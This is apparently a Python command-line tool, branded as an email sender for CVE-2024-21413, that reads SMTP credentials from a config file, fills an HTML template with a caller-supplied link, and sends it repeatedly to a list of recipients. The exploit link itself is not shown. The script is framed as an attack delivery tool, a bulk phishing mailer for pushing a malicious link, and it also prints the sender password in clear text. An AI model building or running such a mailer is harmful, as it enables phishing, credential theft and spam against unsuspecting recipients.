#!/usr/bin/env python3

import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
import os
import argparse
from colorama import Fore, Style, init
import re  
import sys
import time
import platform
import subprocess
import configparser

# Initialize colorama
init(autoreset=True)

# Color class
class colors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKCYAN = '\033[96m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'

# Config reader
config = configparser.ConfigParser()
config.read('config.ini')  

sender_email = config.get('email_credentials', 'sender_email')
sender_password = config.get('email_credentials', 'sender_password')
smtp_server = config.get('email_credentials', 'smtp_server')
smtp_port = config.getint('email_credentials', 'smtp_port')

def print_config(sender_email, sender_password):
    print(f"{colors.HEADER}{'=' * 95}{colors.ENDC}")
    print(f"Sender Email    : {sender_email}")
    print(f"Sender Password : {sender_password}")
    print(f"{colors.HEADER}{'=' * 95}{colors.ENDC}")

def is_running(process):
    try:
        result = subprocess.run(['pidof', process], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        return result.returncode == 0
    except Exception as e:
        print(f"Error checking process: {e}")
        return False

def sprint(text, second=0.05, color=colors.ENDC):
    for line in text + '\n':
        sys.stdout.write(color + line + colors.ENDC)
        sys.stdout.flush()       
        time.sleep(second)

def print_header():
    print(f"{colors.HEADER}{colors.BOLD}{'=' * 95}")
    print(f"{colors.OKBLUE}{colors.BOLD}Email Sending Script CVE-2024-21413{colors.ENDC} Developed by https://github.com/ThemeHacker")
    print(f"{colors.HEADER}{'=' * 95}{colors.ENDC}")

def hacker_text_effect(text, delay=0.05):
    for char in text:
        sys.stdout.write(char)
        sys.stdout.flush()
        time.sleep(delay)
    print()  

def ascii_emailtools():
    __name__ = "HAcKeRTHeme"
    __version__ ="2.4.6"
    print("") 
    art = [
        "███████╗███╗   ███╗ █████╗ ██╗██╗         ████████╗ ██████╗  ██████╗ ██╗     ███████╗",
        "██╔════╝████╗ ████║██╔══██╗██║██║         ╚══██╔══╝██╔═══██╗██╔═══██╗██║     ██╔════╝",
        "█████╗  ██╔████╔██║███████║██║██║            ██║   ██║   ██║██║   ██║██║     ███████╗",
        "██╔══╝  ██║╚██╔╝██║██╔══██║██║██║            ██║   ██║   ██║██║   ██║██║     ╚════██║",
        "███████╗██║ ╚═╝ ██║██║  ██║██║███████╗       ██║   ╚██████╔╝╚██████╔╝███████╗███████║",
        "╚══════╝╚═╝     ╚═╝╚═╝  ╚═╝╚═╝╚══════╝       ╚═╝    ╚═════╝  ╚═════╝ ╚══════╝╚══════╝"
    ]
    colors_list = [Fore.RED, Fore.YELLOW, Fore.GREEN, Fore.CYAN, Fore.BLUE, Fore.MAGENTA]
    for i, line in enumerate(art):
        print(colors_list[i % len(colors_list)] + line)
    sprint("Welcome to Email Tools! " + f'By {__name__}' + f' Version: {__version__}')

def check_and_clear():
    current_platform = platform.system()
    if current_platform == "Windows":
        os.system("cls")
        return "Clearing screen in Windows."
    elif current_platform == "Linux":
        os.system("clear")
        return "Clearing screen in Linux."
    else:
        return "Unknown platform. Cannot clear screen."

def is_valid_email(email):
    regex = r'^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$'
    return re.match(regex, email) is not None

def send_email(receiver_email, subject, link_content=None, email_number=1):

    if not sender_email or not sender_password:
        print(f"{colors.FAIL}Error: Sender email and password must be set in environment variables.{colors.ENDC}")
        return

    if not is_valid_email(receiver_email):
        print(f"{colors.FAIL}Error: Invalid recipient email address: {receiver_email}.{colors.ENDC}")
        return

    msg = MIMEMultipart()
    msg['From'] = sender_email
    msg['To'] = receiver_email
    msg['Subject'] = subject

    with open("template/Stripo.html", "r") as html_file:
        html_content = html_file.read()
    html_content = html_content.replace("{receiver_email}", receiver_email)
    if link_content:
        html_content = html_content.replace("{link_content}", link_content)
    else:
        html_content = html_content.replace("{link_content}", "#") 
    msg.attach(MIMEText(html_content, 'html'))

    try:
        with smtplib.SMTP(smtp_server, smtp_port) as server:
            server.starttls()
            server.login(sender_email, sender_password)
            server.send_message(msg)
            print(f"{colors.OKGREEN}Email sent successfully {email_number} to {receiver_email}.{colors.ENDC}")
    except smtplib.SMTPAuthenticationError:
        print(f"{colors.FAIL}Authentication failed. Check your email and password.{colors.ENDC}")
    except smtplib.SMTPConnectError:
        print(f"{colors.FAIL}Could not connect to the SMTP server. Check your network settings.{colors.ENDC}")
    except Exception as e:
        print(f"{colors.FAIL}Failed to send email {email_number} to {receiver_email}: {e}{colors.ENDC}")

def read_emails_from_file(file_path):
    emails = []
    try:
        with open(file_path, 'r') as f:
            for line in f:
                email = line.strip()
                if is_valid_email(email):
                    emails.append(email)
                else:
                    print(f"{colors.WARNING}Invalid email skipped: {email}{colors.ENDC}")
    except FileNotFoundError:
        print(f"{colors.FAIL}Error: File {file_path} not found.{colors.ENDC}")
    return emails

if __name__ == "__main__":
    print_config(sender_email, sender_password)
    print_header()
    ascii_emailtools()

    parser = argparse.ArgumentParser(description='Send emails using SMTP.')
    parser.add_argument('--recipient', required=False, help='Recipient email addresses (comma-separated)')
    parser.add_argument('--subject', required=True, help='Subject of the email')
    parser.add_argument('--link', required=False, help='Optional link to include in the email')
    parser.add_argument('--count', type=int, required=True, help='Number of times to send the email')
    parser.add_argument('--file', required=False, help='Optional file with email addresses (one per line)')

    args = parser.parse_args()

    if args.file:
        recipient_list = read_emails_from_file(args.file)
    elif args.recipient:
        recipient_list = args.recipient.split(',')
    else:
        print(f"{colors.FAIL}Error: No recipients provided.{colors.ENDC}")
        sys.exit(1)

    if not recipient_list:
        print(f"{colors.FAIL}Error: No valid recipients found.{colors.ENDC}")
        sys.exit(1)

    for i in range(1, args.count + 1):
        for recipient_email in recipient_list:
            recipient_email = recipient_email.strip()  
            try:
                send_email(recipient_email, args.subject, args.link, i)
            except KeyboardInterrupt:
                print(Fore.RED + f"Process interrupted by user." + Style.RESET_ALL)
                sys.exit(1)
